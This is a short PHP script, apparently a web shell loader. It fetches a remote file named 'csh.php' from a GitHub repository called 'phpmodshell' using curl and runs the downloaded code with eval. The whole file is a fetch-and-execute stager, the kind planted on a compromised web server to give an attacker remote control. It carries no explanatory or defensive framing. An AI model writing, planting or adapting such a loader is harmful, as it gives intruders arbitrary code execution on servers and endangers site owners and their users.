<?php
    $Url = "https://raw.githubusercontent.com/CoderSigma/phpmodshell/main/csh.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);

?>